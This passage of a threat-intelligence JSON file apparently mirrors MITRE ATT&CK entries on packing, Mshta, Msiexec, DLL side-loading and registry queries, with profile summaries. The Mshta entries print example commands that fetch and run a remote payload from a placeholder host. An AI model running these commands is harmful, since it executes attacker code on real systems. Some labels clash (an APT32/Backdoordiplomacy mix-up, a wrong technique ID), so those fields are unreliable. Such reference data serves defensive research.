    "16689": {
        "semantic": 1,
        "phase_names": [
            "defense-evasion"
        ],
        "entity_type": "attack-pattern",
        "aliases": [
            "Software Packing"
        ],
        "unique_id": "ec49dd8b-da34-4925-9a62-4c7b9859b480",
        "name": "T1027.002",
        "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "x_mitre_description": "",
        "platforms": [
            "macos",
            "linux",
            "windows"
        ],
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "patchwork",
            "zirconium",
            "ta505",
            "medusa group",
            "apt41",
            "dark caracal",
            "threat group-3390",
            "storm-0501",
            "volt typhoon",
            "apt29",
            "the white company",
            "teamtnt",
            "apt3",
            "gallium",
            "rocke",
            "saint bear",
            "elderwood",
            "ta2541",
            "apt38",
            "kimsuky",
            "moustachedbouncer",
            "aoqin dragon",
            "apt39"
        ],
        "uncertain_id": "t1027.002",
        "uncertain_name": "software packing",
        "uncertain_mes": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",
        "processed": true,
        "hsage": 10.381850228921484,
        "profile_without_enhance_5": "[profile]T1027.002, known as Software Packing, is a Defense Evasion technique applicable to Windows, Linux, and macOS. It involves compressing or encrypting an executable to alter its file signature and evade signature-based detection, with the original code typically being decompressed in memory during execution. Adversaries utilize packers like MPRESS and UPX or develop custom packing methods to avoid leaving known artifacts. This technique has been associated with numerous threat groups including APT29, APT41, and Volt Typhoon."
    },
    "16690": {
        "semantic": 1,
        "phase_names": [
            "defense-evasion"
        ],
        "entity_type": "attack-pattern",
        "aliases": [
            "Mshta"
        ],
        "unique_id": "cf406fcf-0eaa-4af0-b472-f807b6ee8f8d",
        "name": "T1218.005",
        "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))`\n\nThey may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "x_mitre_description": "",
        "platforms": [
            "windows"
        ],
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "sidewinder",
            "earth lusca",
            "apt38",
            "muddywater",
            "fin7",
            "gamaredon group",
            "kimsuky",
            "apt29",
            "mustang panda",
            "inception",
            "apt32",
            "sidecopy",
            "ta551",
            "confucius",
            "lazarus group",
            "lazyscripter",
            "ta2541"
        ],
        "uncertain_id": "t1218.005",
        "uncertain_name": "mshta",
        "uncertain_mes": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
        "processed": true,
        "hsage": 11.916339485459144,
        "profile_without_enhance_5": "[profile]T1218.005, Mshta, is a Defense Evasion technique for Windows where adversaries abuse the trusted mshta.exe utility to execute malicious code. It proxies execution of Microsoft HTML Application (HTA) files or inline scripts (e.g., `mshta vbscript:Close(Execute(\"GetObject(\\\"script:https[:]//webserver/payload[.]sct\\\")\"))` or `mshta http[:]//webserver/payload[.]hta`), bypassing application control and browser security settings. It is used by groups including FIN7, Lazarus Group, and APT29."
    },
    "16691": {
        "semantic": 1,
        "phase_names": [
            "discovery"
        ],
        "entity_type": "attack-pattern",
        "aliases": [
            "Query Registry"
        ],
        "unique_id": "aff2a6c6-a1c6-419c-acaa-f612b10da09d",
        "name": "T1012",
        "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "x_mitre_description": "",
        "platforms": [
            "windows"
        ],
        "standard_attck_id": "T1012",
        "standard_attck_name": "Query Registry",
        "gid": 567,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "zirconium",
            "indrik spider",
            "stealth falcon",
            "dragonfly",
            "blackbyte",
            "fox kitten",
            "apt41",
            "turla",
            "threat group-3390",
            "volt typhoon",
            "gamaredon group",
            "chimera",
            "apt32",
            "daggerfly",
            "lotus blossom",
            "lazarus group",
            "oilrig",
            "kimsuky",
            "apt39"
        ],
        "uncertain_id": "t1012",
        "uncertain_name": "query registry",
        "uncertain_mes": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
        "processed": true,
        "hsage": 10.056374916677537,
        "profile_without_enhance_5": "[profile]Query Registry is technique T1012 under the Discovery tactic, targeting Windows platforms. It involves adversaries interacting with the Windows Registry to gather system, configuration, and software information, often using utilities like Reg.exe. This data is used during automated discovery to inform follow-on actions. The technique is employed by numerous groups including APT41, Lazarus Group, and Volt Typhoon, and can be used for specific checks like querying the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language registry key to infer system language.[/profile]"
    },
    "16692": {
        "semantic": 1,
        "unique_id": "897f0896-2911-4398-8499-ca3ad9d51ce9",
        "entity_type": "malware",
        "name": "Tromas",
        "is_family": false,
        "no_semantic_neighbors": [],
        "processed": true,
        "hsage": 5.6461041397926275,
        "profile_without_enhance_5": "[profile]Tromas is a malware entity that employs Defense Evasion techniques including System Binary Proxy Execution (T1218), specifically abusing msiexec.exe (T1218.007) to proxy malicious payloads, and utilizes Masquerading (T1036) and Process Injection (T1055). Its execution relies on User Execution (T1204), typically via phishing. The malware targets Windows platforms.[profile]"
    },
    "16693": {
        "semantic": 1,
        "phase_names": [],
        "entity_type": "attack-pattern",
        "unique_id": "98bcb767-8135-4c00-a07d-6b9531ad16cc",
        "aliases": [
            "T1574.002"
        ],
        "name": "DLL Side-Loading",
        "kill_chain_names": [],
        "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
        "x_mitre_description": "",
        "platforms": [],
        "standard_attck_id": "T1574.002",
        "standard_attck_name": "DLL Side-Loading",
        "gid": 569,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [],
        "uncertain_id": "t1073",
        "uncertain_name": "dll side-loading",
        "uncertain_mes": "Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)\n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",
        "processed": true,
        "hsage": 4.9882806788692795,
        "profile_without_enhance_5": "[profile]DLL Side-Loading, identified as T1574.002, is a Defense Evasion and Persistence technique primarily for Windows. It involves an adversary planting a malicious DLL and a legitimate, vulnerable application in the same directory, then invoking that application. The Windows loader, following its standard search order, prioritizes and loads the malicious DLL from the local directory over the legitimate system library, thereby executing the adversary's payload under the guise of a trusted process. This method often exploits vague specifications in Windows Side-by-Side manifests and can be used to mask malicious activity with elevated privileges.[/profile]"
    },
    "16694": {
        "semantic": 1,
        "phase_names": [
            "defense-evasion"
        ],
        "entity_type": "attack-pattern",
        "aliases": [
            "Msiexec"
        ],
        "unique_id": "82d92e6e-fa8e-4792-a3c0-d902205e8463",
        "name": "T1218.007",
        "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "x_mitre_description": "",
        "platforms": [
            "windows"
        ],
        "standard_attck_id": "T1218.007",
        "standard_attck_name": "Msiexec",
        "gid": 570,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "rancor",
            "apt38",
            "machete",
            "zirconium",
            "ta505",
            "molerats"
        ],
        "uncertain_id": "t1218.007",
        "uncertain_name": "msiexec",
        "uncertain_mes": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
        "processed": true,
        "hsage": 12.953115446321673,
        "profile_without_enhance_5": "[profile]T1218.007, also known as Msiexec, is a Defense Evasion technique for Windows. It involves abusing the msiexec.exe command-line utility to proxy execution of malicious payloads, including local or network MSI files and DLLs. Its use can bypass application control and, if the AlwaysInstallElevated policy is enabled, achieve execution with SYSTEM privileges. This technique has been used by groups including Rancor, APT38, and TA505.[profile]"
    },
    "16695": {
        "created_time": "2025-08-14T07:15:38.116Z",
        "semantic": 1,
        "aka_name": [],
        "entity_type": "intrusion-set",
        "unique_id": "3d97112f-7e5b-4144-b6e9-bce28127b040",
        "modified_time": "2025-08-21T08:58:40.412Z",
        "group_name": "APT32",
        "name": "unkown_apt_group",
        "description": "",
        "no_semantic_neighbors": [],
        "processed": true,
        "hsage": 0.0,
        "profile_without_enhance_5": "[profile]This intrusion set, likely associated with the Backdoordiplomacy APT group (also known as Backdip, Quarian, or Cloudcomputating), employs tools including Cobalt Strike and the Tromas malware, which notably abuses msiexec.exe (T1218.007) for defense evasion. Its key TTPs involve System Binary Proxy Execution (T1218), User Execution via phishing, and Boot or Logon Autostart Execution for persistence. The group's origin is not explicitly stated in the provided data, but it shows operational links to the Backdoordiplomacy cluster. Target sectors and primary motivations are not detailed in the available information.[/profile]"
    },
    "16696": {
        "semantic": 1,
        "phase_names": [],
        "entity_type": "attack-pattern",
        "aliases": [
            "T1574.002"
        ],
        "unique_id": "54536d69-7cbc-45b4-8466-6dab71384426",
        "name": "T1574.002",
        "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
        "kill_chain_names": [],
        "x_mitre_description": "",
        "platforms": [],
        "standard_attck_id": "T1574.002",
        "standard_attck_name": "DLL Side-Loading",
        "gid": 572,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [],
        "uncertain_id": "t1574.002",
        "uncertain_name": "dll side-loading",
        "uncertain_mes": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
        "processed": true,
        "hsage": 3.777761061661561,
        "profile_without_enhance_5": "[profile]The entity is the MITRE ATT&CK technique DLL Side-Loading, identified as T1574.002 under the Defense Evasion tactic. It operates by hijacking a program's DLL search order, positioning both a legitimate application and a malicious DLL payload in the same directory. When the trusted application is invoked, it is tricked into loading and executing the adversary's payload, thereby masking malicious actions under a legitimate process. This technique is distinct from simple DLL search order hijacking as it involves the active planting and invocation of the application."
    },
    "16697": {
        "semantic": 1,
        "phase_names": [
            "defense-evasion"
        ],
        "entity_type": "attack-pattern",
        "aliases": [
            "Msiexec"
        ],
        "unique_id": "5e80d95a-7c4c-4c28-a89a-7b1ee6ba34f9",
        "name": "Msiexec",
        "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "x_mitre_description": "",
        "platforms": [
            "windows"
        ],
        "standard_attck_id": "T1218.007",
        "standard_attck_name": "Msiexec",
        "gid": 573,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "rancor",
            "apt38",
            "machete",
            "zirconium",
            "ta505",
            "molerats"
        ],
        "uncertain_id": "t1218.007",
        "uncertain_name": "msiexec",
        "uncertain_mes": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
        "processed": true,
        "hsage": 12.398184005140672,
        "profile_without_enhance_5": "[profile]Msiexec is the technique T1218.007 (Msiexec) within the Defense Evasion tactic for Windows. It involves abusing the trusted, signed msiexec.exe command-line utility to proxy execution and bypass application controls. Adversaries use it to launch local or network MSI files and execute DLLs, with potential privilege escalation to SYSTEM if the AlwaysInstallElevated policy is enabled. It has been used by groups including APT38, TA505, and Molerats.[profile]"
    },
    "16698": {
        "semantic": 1,
        "phase_names": [
            "defense-evasion"
        ],
        "entity_type": "attack-pattern",
        "unique_id": "7ee215a5-9d18-4613-9657-dbb0b32c5094",
        "aliases": [
            "Software Packing"
        ],
        "name": "Software Packing",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)",
        "x_mitre_description": "",
        "platforms": [
            "macos",
            "linux",
            "windows"
        ],
        "standard_attck_id": "T1406.002",
        "standard_attck_name": "Software Packing",
        "gid": 574,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "patchwork",
            "zirconium",
            "ta505",
            "medusa group",
            "apt41",
            "dark caracal",
            "threat group-3390",
            "storm-0501",
            "volt typhoon",
            "apt29",
            "the white company",
            "teamtnt",
            "apt3",
            "gallium",
            "rocke",
            "saint bear",
            "elderwood",
            "ta2541",
            "apt38",
            "kimsuky",
            "moustachedbouncer",
            "aoqin dragon",
            "apt39"
        ],
        "uncertain_id": "t1027.002",
        "uncertain_name": "software packing",
        "uncertain_mes": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",
        "processed": true,
        "hsage": 9.265234417359297,
        "profile_without_enhance_5": "[profile]Software Packing is a Defense Evasion technique (MITRE ATT&CK T1027.002) applicable to Windows, Linux, and macOS. It involves compressing or encrypting an executable using packers like UPX or MPRESS to alter its file signature and evade signature-based detection, with the original code typically decompressed in memory during execution. Adversaries may also employ custom packers or virtual machine software protection to further obfuscate their code and avoid artifacts associated with known tools."
    },
    "16699": {
        "semantic": 1,
        "phase_names": [
            "execution"
        ],
        "entity_type": "attack-pattern",
        "aliases": [
            "Python"
        ],
        "unique_id": "9889fb51-4c0c-41b2-b33b-d89c31b87001",
        "name": "T1059.006",
        "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the `python.exe` interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
        "kill_chain_names": [
            "mitre-attack"
        ],
        "x_mitre_description": "",
        "platforms": [
            "macos",
            "linux",
            "windows",
            "ESXi"
        ],
        "standard_attck_id": "T1059.006",
        "standard_attck_name": "Python",
        "gid": 575,
        "no_semantic_neighbors": [],
        "uncertain_related_groups": [
            "apt37",
